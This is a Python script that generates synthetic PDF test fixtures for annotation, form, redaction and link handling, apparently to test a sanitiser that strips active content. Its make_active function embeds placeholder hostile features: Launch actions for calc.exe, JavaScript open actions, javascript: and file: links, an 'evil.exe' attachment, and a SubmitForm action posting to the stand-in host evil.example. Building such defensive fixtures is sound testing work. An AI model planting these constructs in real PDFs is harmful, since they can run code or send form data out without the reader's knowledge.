#!/usr/bin/env python3
"""Regenerates the small PDF fixtures used by the annotation, form, link and redaction tests.

Needs pikepdf and reportlab (`pip install pikepdf reportlab`). The generated files are committed,
so the tests never need Python; run this only to change a fixture.

Every file is synthetic: no client material.
"""
import io
import os

import pikepdf
from pikepdf import Array, Dictionary, Name, String
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas

HERE = os.path.dirname(os.path.abspath(__file__))


def out(name):
    return os.path.join(HERE, name)


def text_pdf(labels, form=None):
    """One page per label; `form` is an optional callable(canvas, page_number)."""
    buf = io.BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)
    for n, label in enumerate(labels, start=1):
        c.setFont('Helvetica', 24)
        c.drawString(60, 760, label)
        if form:
            form(c, n)
        c.showPage()
    c.save()
    buf.seek(0)
    return pikepdf.open(buf)


def ap_stream(pdf, w, h, content):
    stream = pikepdf.Stream(pdf, content.encode('latin1'))
    stream.Type = Name.XObject
    stream.Subtype = Name.Form
    stream.BBox = Array([0, 0, w, h])
    stream.Resources = Dictionary()
    return stream


# ---- clean and redaction -------------------------------------------------------------------

def make_clean():
    pdf = text_pdf(['CLEAN one', 'CLEAN two', 'CLEAN three'])
    pdf.save(out('clean3.pdf'))


def make_redact():
    """Four pages; pages 2 and 4 carry /Redact annotations that were never applied."""
    pdf = text_pdf(['REDACT one', 'REDACT two SECRET', 'REDACT three', 'REDACT four SECRET'])
    for index in (1, 3):
        page = pdf.pages[index]
        annot = pdf.make_indirect(Dictionary(
            Type=Name.Annot, Subtype=Name.Redact, Rect=Array([55, 750, 400, 790]),
            QuadPoints=Array([55, 790, 400, 790, 55, 750, 400, 750]),
            IC=Array([0, 0, 0]), F=4, Contents=String('marked for redaction'),
        ))
        page.Annots = Array([annot])
    pdf.save(out('redact.pdf'))


def make_redact_first():
    """One page whose first (and only) page carries an unapplied /Redact marker: a coversheet case."""
    pdf = text_pdf(['REDACT cover SECRET'])
    annot = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.Redact, Rect=Array([55, 750, 400, 790]),
        QuadPoints=Array([55, 790, 400, 790, 55, 750, 400, 750]), IC=Array([0, 0, 0]), F=4))
    pdf.pages[0].Annots = Array([annot])
    pdf.save(out('redact_first.pdf'))


# ---- annotations with appearance streams ---------------------------------------------------

def make_annots():
    pdf = text_pdf(['ANNOTS one'])
    page = pdf.pages[0]
    yellow = ap_stream(pdf, 200, 24, '1 1 0 rg 0 0 200 24 re f')
    note = ap_stream(pdf, 20, 20, '1 0.8 0 rg 0 0 20 20 re f')
    stamp = ap_stream(pdf, 120, 40, '1 0 0 RG 3 w 2 2 116 36 re S')
    freetext = ap_stream(pdf, 200, 40, '0.9 0.9 1 rg 0 0 200 40 re f BT /Helv 12 Tf 0 g 4 14 Td (FREE TEXT) Tj ET')
    freetext.Resources = Dictionary(Font=Dictionary(Helv=Dictionary(
        Type=Name.Font, Subtype=Name.Type1, BaseFont=Name.Helvetica)))
    ink = ap_stream(pdf, 100, 60, '0 0 1 RG 2 w 5 5 m 95 55 l S')

    def annot(subtype, rect, ap, **extra):
        d = Dictionary(Type=Name.Annot, Subtype=subtype, Rect=Array(rect), F=4,
                       AP=Dictionary(N=ap), **extra)
        return pdf.make_indirect(d)

    page.Annots = Array([
        annot(Name.Highlight, [55, 750, 255, 774], yellow,
              QuadPoints=Array([55, 774, 255, 774, 55, 750, 255, 750]), C=Array([1, 1, 0])),
        annot(Name.Text, [300, 700, 320, 720], note, Contents=String('sticky note'), Name=Name.Note),
        annot(Name.Stamp, [55, 600, 175, 640], stamp, Name=Name.Approved),
        annot(Name.FreeText, [55, 500, 255, 540], freetext, Contents=String('FREE TEXT'),
              DA=String('/Helv 12 Tf 0 g')),
        annot(Name.Ink, [300, 400, 400, 460], ink, InkList=Array([Array([305, 405, 395, 455])])),
    ])
    pdf.save(out('annots.pdf'))


# ---- form fields ---------------------------------------------------------------------------

def make_form(value, checked, filename):
    def draw(c, n):
        form = c.acroForm
        form.textfield(name='name', tooltip='Name', x=60, y=680, width=200, height=24, value=value,
                       borderStyle='solid', forceBorder=True)
        form.checkbox(name='agree', tooltip='Agree', x=60, y=640, size=20, checked=checked,
                      borderStyle='solid', forceBorder=True)
        form.radio(name='choice', tooltip='A', value='A', selected=True, x=60, y=600, size=20)
        form.radio(name='choice', tooltip='B', value='B', selected=False, x=100, y=600, size=20)
    pdf = text_pdf([f'FORM {value}'], form=draw)
    pdf.save(out(filename))


# ---- links, actions, attachments, bookmarks -------------------------------------------------

def make_links():
    pdf = text_pdf(['LINKS one', 'LINKS two', 'LINKS three', 'LINKS four'])
    pages = pdf.pages

    def link(rect, **action):
        return pdf.make_indirect(Dictionary(
            Type=Name.Annot, Subtype=Name.Link, Rect=Array(rect), Border=Array([0, 0, 1]), **action))

    page3 = pages[2].obj
    uri = link([55, 700, 300, 730], A=Dictionary(S=Name.URI, URI=String('https://example.org/')))
    goto = link([55, 650, 300, 680], Dest=Array([page3, Name.Fit]))
    goto_action = link([55, 600, 300, 630], A=Dictionary(S=Name.GoTo, D=Array([pages[3].obj, Name.Fit])))
    named = link([55, 550, 300, 580], Dest=String('chapter-three'))
    launch = link([55, 500, 300, 530], A=Dictionary(S=Name.Launch, F=String('calc.exe')))
    js = link([55, 450, 300, 480], A=Dictionary(S=Name.JavaScript, JS=String('app.alert("hi")')))
    pages[0].Annots = Array([uri, goto, goto_action, named, launch, js])

    attach_data = pikepdf.Stream(pdf, b'secret attachment')
    attach_data.Type = Name.EmbeddedFile
    filespec = pdf.make_indirect(Dictionary(
        Type=Name.Filespec, F=String('note.txt'), UF=String('note.txt'), EF=Dictionary(F=attach_data)))
    fileannot = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.FileAttachment, Rect=Array([55, 400, 75, 420]), FS=filespec,
        Contents=String('attached')))
    pages[1].Annots = Array([fileannot])

    js_action = pdf.make_indirect(Dictionary(S=Name.JavaScript, JS=String('app.alert("open")')))
    pdf.Root.OpenAction = js_action
    pdf.Root.Names = Dictionary(
        Dests=Dictionary(Names=Array([String('chapter-three'), Array([page3, Name.XYZ, 0, 800, 0])])),
        JavaScript=Dictionary(Names=Array([String('startup'), Dictionary(S=Name.JavaScript, JS=String('1'))])),
        EmbeddedFiles=Dictionary(Names=Array([String('note.txt'), filespec])),
    )

    item2 = pdf.make_indirect(Dictionary(Title=String('Chapter two'), Dest=Array([pages[1].obj, Name.Fit])))
    item3 = pdf.make_indirect(Dictionary(Title=String('Chapter three'), Dest=Array([page3, Name.Fit])))
    outlines = pdf.make_indirect(Dictionary(Type=Name.Outlines, Count=2))
    outlines.First, outlines.Last = item2, item3
    item2.Parent = outlines
    item3.Parent = outlines
    item2.Next = item3
    item3.Prev = item2
    pdf.Root.Outlines = outlines
    pdf.save(out('links.pdf'))


# ---- active content: every way a PDF can carry a script, a program or a payload --------------

def make_active():
    """Two pages that try every route for active content into a bundle.

    Page 1 holds the good things that must survive (a web link, a mail link, a phone link, a link to
    page 2, a highlight with an appearance) among the hostile ones: a web link with a JavaScript
    action chained behind it (and a link whose chain loops back on itself), Launch, SubmitForm,
    ImportData and remote GoTo links, links to javascript: and file: addresses, a widget with a
    script (one in the form and one that no form lists) whose field also has an additional
    action, a Square annotation that launches a program, a Stamp with an action, and every attachment
    and media annotation kind. Page level: an open script, an additional-action dictionary, an article
    thread whose bead points at page 2, an associated file. Document level: an open action, document
    additional actions, a JavaScript and an embedded-files name tree, an XFA form, and a portfolio
    collection.
    """
    pdf = text_pdf(['ACTIVE one', 'ACTIVE two'])
    p1, p2 = pdf.pages[0], pdf.pages[1]
    root = pdf.Root

    def js(source):
        return pdf.make_indirect(Dictionary(S=Name.JavaScript, JS=String(source)))

    def link(rect, **extra):
        return pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=Name.Link, Rect=Array(rect), Border=Array([0, 0, 1]), **extra))

    payload = pikepdf.Stream(pdf, b'MZ hostile attachment')
    payload.Type = Name.EmbeddedFile
    filespec = pdf.make_indirect(Dictionary(Type=Name.Filespec, F=String('evil.exe'), UF=String('evil.exe'),
                                            EF=Dictionary(F=payload), AFRelationship=Name.Source))

    good_uri = link([55, 700, 300, 720], A=Dictionary(S=Name.URI, URI=String('https://example.org/good')))
    good_mail = link([55, 675, 300, 695], A=Dictionary(S=Name.URI, URI=String('mailto:clerk@example.org')))
    good_tel = link([55, 650, 300, 670], A=Dictionary(S=Name.URI, URI=String('tel:+442070000000')))
    to_page2 = link([55, 625, 300, 645], Dest=Array([p2.obj, Name.Fit]))
    chained = link([55, 600, 300, 620], A=Dictionary(S=Name.URI, URI=String('https://example.org/chained'),
                                                     Next=js('app.alert("chained")')))
    loop_action = pdf.make_indirect(Dictionary(S=Name.URI, URI=String('https://example.org/loop')))
    loop_action.Next = loop_action
    looped = link([55, 575, 300, 595], A=loop_action)
    launch = link([55, 550, 300, 570], A=Dictionary(S=Name.Launch, F=String('calc.exe'),
                                                    Win=Dictionary(F=String('calc.exe'))))
    submit = link([55, 525, 300, 545], A=Dictionary(S=Name.SubmitForm, F=Dictionary(FS=Name.URL, F=String('https://evil.example/collect'))))
    imp = link([55, 500, 300, 520], A=Dictionary(S=Name.ImportData, F=String('data.fdf')))
    remote = link([55, 475, 300, 495], A=Dictionary(S=Name.GoToR, F=String('other.pdf'), D=Array([0, Name.Fit])))
    js_uri = link([55, 450, 300, 470], A=Dictionary(S=Name.URI, URI=String('javascript:alert(1)')))
    file_uri = link([55, 425, 300, 445], A=Dictionary(S=Name.URI, URI=String('file:///C:/Windows/System32/calc.exe')))

    # A form field (listed in the AcroForm) and a widget no form lists, both with scripts.
    field_aa = Dictionary(C=js('calculate()'), K=js('keystroke()'))
    field = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.Widget, FT=Name.Tx, T=String('listed'), Rect=Array([300, 700, 500, 724]),
        V=String('x'), A=Dictionary(S=Name.JavaScript, JS=String('app.alert("widget")')), AA=field_aa, F=4))
    orphan_parent = pdf.make_indirect(Dictionary(FT=Name.Tx, T=String('parent'), AA=Dictionary(F=js('format()'))))
    orphan = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.Widget, Rect=Array([300, 650, 500, 674]), F=4, Parent=orphan_parent,
        A=Dictionary(S=Name.JavaScript, JS=String('app.alert("orphan")')),
        AP=Dictionary(N=ap_stream(pdf, 200, 24, '0.9 g 0 0 200 24 re f'))))
    orphan_parent.Kids = Array([orphan])
    square = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.Square, Rect=Array([300, 600, 400, 640]), F=4,
        A=Dictionary(S=Name.Launch, F=String('calc.exe')),
        AP=Dictionary(N=ap_stream(pdf, 100, 40, '1 0 0 RG 2 w 2 2 96 36 re S'))))
    stamp = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.Stamp, Rect=Array([300, 550, 400, 590]), F=4, Name=Name.Draft,
        A=Dictionary(S=Name.URI, URI=String('https://example.org/stamp')),
        AP=Dictionary(N=ap_stream(pdf, 100, 40, '0 0 1 RG 2 w 2 2 96 36 re S'))))
    highlight = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.Highlight, Rect=Array([55, 750, 255, 774]), F=4, C=Array([1, 1, 0]),
        QuadPoints=Array([55, 774, 255, 774, 55, 750, 255, 750]),
        AP=Dictionary(N=ap_stream(pdf, 200, 24, '1 1 0 rg 0 0 200 24 re f'))))
    text_note = pdf.make_indirect(Dictionary(
        Type=Name.Annot, Subtype=Name.Text, Rect=Array([420, 700, 440, 720]), F=4, Contents=String('note'),
        AA=Dictionary(E=js('enter()'))))
    popup = pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=Name.Popup, Rect=Array([420, 620, 520, 700]),
                                         Parent=text_note, A=Dictionary(S=Name.JavaScript, JS=String('popup()'))))
    text_note.Popup = popup

    def media(subtype, **extra):
        return pdf.make_indirect(Dictionary(Type=Name.Annot, Subtype=subtype, Rect=Array([420, 400, 440, 420]), F=4, **extra))

    attachments = [
        media(Name.FileAttachment, FS=filespec, Contents=String('attached')),
        media(Name.Screen, A=Dictionary(S=Name.Rendition, OP=0, JS=String('play()'))),
        media(Name.Movie, Movie=Dictionary(F=String('clip.mov'))),
        media(Name.Sound, Sound=pikepdf.Stream(pdf, b'\x00\x01')),
        media(Name.RichMedia, RichMediaContent=Dictionary(Assets=Dictionary(Names=Array([String('a.swf'), filespec])))),
        media(getattr(Name, '3D'), **{'3DD': pikepdf.Stream(pdf, b'u3d')}),
    ]

    p1.Annots = Array([good_uri, good_mail, good_tel, to_page2, chained, looped, launch, submit, imp, remote,
                       js_uri, file_uri, field, orphan, square, stamp, highlight, text_note, popup] + attachments)

    # Page level.
    p1.AA = Dictionary(O=js('pageOpen()'), C=js('pageClose()'))
    p1.AF = Array([filespec])
    p1.PieceInfo = Dictionary(App=Dictionary(Private=Dictionary(Data=String('private'))))
    bead1 = pdf.make_indirect(Dictionary(Type=Name.Bead, P=p1.obj, R=Array([50, 50, 300, 300])))
    bead2 = pdf.make_indirect(Dictionary(Type=Name.Bead, P=p2.obj, R=Array([50, 50, 300, 300]), V=bead1, N=bead1))
    bead1.N, bead1.V = bead2, bead2
    p1.B = Array([bead1])

    # Document level.
    root.OpenAction = js('docOpen()')
    root.AA = Dictionary(WC=js('willClose()'), WS=js('willSave()'))
    root.AF = Array([filespec])
    root.Collection = Dictionary(Type=Name.Collection, View=Name.T)
    xfa = pikepdf.Stream(pdf, b'<template/>')
    root.AcroForm = Dictionary(Fields=Array([field]), XFA=Array([String('template'), xfa]), NeedAppearances=True)
    root.Names = Dictionary(
        JavaScript=Dictionary(Names=Array([String('startup'), Dictionary(S=Name.JavaScript, JS=String('startup()'))])),
        EmbeddedFiles=Dictionary(Names=Array([String('evil.exe'), filespec])),
    )
    pdf.save(out('active.pdf'))


if __name__ == '__main__':
    make_clean()
    make_redact()
    make_redact_first()
    make_annots()
    make_form('Alice', True, 'form_a.pdf')
    make_form('Bob', False, 'form_b.pdf')
    make_links()
    make_active()
    print('written to', HERE)
